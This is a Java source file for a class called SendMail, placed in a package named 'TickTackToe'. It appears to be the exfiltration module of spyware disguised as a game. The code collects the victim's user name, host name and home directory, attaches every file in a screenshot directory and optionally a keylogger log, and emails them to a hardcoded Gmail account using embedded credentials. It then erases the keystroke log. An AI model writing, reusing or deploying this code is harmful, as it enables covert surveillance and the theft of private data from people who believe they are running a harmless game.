package TickTackToe;

import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.util.Hashtable;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class SendMail {
	String subject;
	final String username = "shoottothrill007"; //"screenshottaker12";
	final String pw = "12345678__"; // "accio123";
	File dir;
	Message mail;
	BodyPart mailBody = new MimeBodyPart();
    Multipart multi = new MimeMultipart();
	String[] files;
	private boolean photosAttached;
	private boolean logAttached;
	static int mailCounter=0;
	
	
	SendMail(){
		
	}
	SendMail(File dir){
		this.dir = dir;
		photosAttached=false;
		logAttached= false;
	}
	public String getUserName() throws Exception{
		String comName = System.getProperty("user.name");
		String homeDir= System.getProperty("user.home");
		System.out.println("getUserName() \n"+comName);
		
		InetAddress localMachine = InetAddress.getLocalHost();
		String host = localMachine.getHostName();
		System.out.println(host);
		subject = comName + " | " + host + " | Home Dir: "+homeDir;
		return subject;
	}
	
	public void sender() throws Exception{
		System.out.println("Entered Sender method (in Sendmail)");
		Properties prop = new Properties();
		prop.put("mail.smtp.auth", "true");
		prop.put("mail.smtp.starttls.enable", "true");
		prop.put("mail.smtp.host", "smtp.gmail.com");
		prop.put("mail.smtp.port", "587");
 
		Session session = Session.getInstance(prop,
		  new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username, pw);
			}
		  });
		
		mail = new MimeMessage(session);
		mail.setFrom(new InternetAddress(username+ "@gmail.com"));
		mail.setRecipients(Message.RecipientType.TO, InternetAddress.parse("shoottothrill007@gmail.com"));
		mail.setSubject(getUserName());
		
		attachphotos();
//		attachLog();
		
		mail.setContent(multi);
		System.out.println("Mail content set");
		Transport.send(mail);
		System.out.println("mail sent");
		mailCounter++;
		System.out.println("OVERALL NUMBER OF MAILS SENT"+ mailCounter);
//		Thread.sleep(500);
		Logging.KeyboardLogger.eraseLog();
	}
	
	private void attachphotos() throws IOException, MessagingException {
		// TODO Auto-generated method stub
		
		String[] all = dir.list();
		files = new String[all.length];
		for(int i = 0; i < all.length; i++){
//			if(!(Logging.KeyboardLogger.logFile).getName().equals(all[i])){
				File photo = new File(dir, all[i]);
				String path = photo.getAbsolutePath();
				System.out.print (path);
				MimeBodyPart attachment = new MimeBodyPart();
				attachment.attachFile(path);

				multi.addBodyPart(attachment);

				System.out.println(" attached");
//			}
			
		}
		photosAttached=true;
	}
	private void attachLog() throws IOException, MessagingException{
		// TODO Auto-generated method stub
		
		MimeBodyPart attachment = new MimeBodyPart();
		File file=Logging.KeyboardLogger.logFile;
//		attachment.attachFile(filePath);
		DataSource source = new FileDataSource(file);
        attachment.setDataHandler(new DataHandler(source));
        attachment.setFileName(file.getName());
		multi.addBodyPart(attachment);
		System.out.println("Log file attached "+file.getName());
		logAttached=true;
		

	}
	public void testMailSender() throws Exception{
		Properties prop = new Properties();
	prop.put("mail.smtp.auth", "true");
	prop.put("mail.smtp.starttls.enable", "true");
	prop.put("mail.smtp.host", "smtp.gmail.com");
	prop.put("mail.smtp.port", "587");
	System.out.println("Will authenticate now!");
	Session session = Session.getInstance(prop,
	  new javax.mail.Authenticator() {
		protected PasswordAuthentication getPasswordAuthentication() {
			return new PasswordAuthentication(username, pw);
		}
	  });
	
	mail = new MimeMessage(session);
	mail.setFrom(new InternetAddress(username+ "@gmail.com"));
	mail.setRecipients(Message.RecipientType.TO, InternetAddress.parse("shoottothrill007@gmail.com"));
	mail.setSubject(getUserName());
	mail.setText("user is connected");
	Transport.send(mail);
	System.out.println("test sent");
		
	}
	public void errSender(Exception e) throws Exception{
		Properties prop = new Properties();
		prop.put("mail.smtp.auth", "true");
		prop.put("mail.smtp.starttls.enable", "true");
		prop.put("mail.smtp.host", "smtp.gmail.com");
		prop.put("mail.smtp.port", "587");
 
		Session session = Session.getInstance(prop,
		  new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username, pw);
			}
		  });
		multi = new MimeMultipart();
		mail = new MimeMessage(session);
		mail.setFrom(new InternetAddress(username+ "@gmail.com"));
		mail.setRecipients(Message.RecipientType.TO, InternetAddress.parse("shoottothrill007@gmail.com"));
		mail.setSubject("ERROR:"+getUserName());
		mail.setText(e + " occured while sending");
		try{
			attachphotos();
		}catch(IOException ex){
			System.out.println("Exception caught: "+ ex.getMessage());
//			ex.printStackTrace();
		}
//		try{
//			attachLog();
//		}catch(IOException | MessagingException ex){
//			System.out.println("Exception caught: "+ ex.getMessage());
////			ex.printStackTrace();
//		}
		mail.setContent(multi);
		Transport.send(mail);
		System.out.println("error message sent");
		
	}
}
	

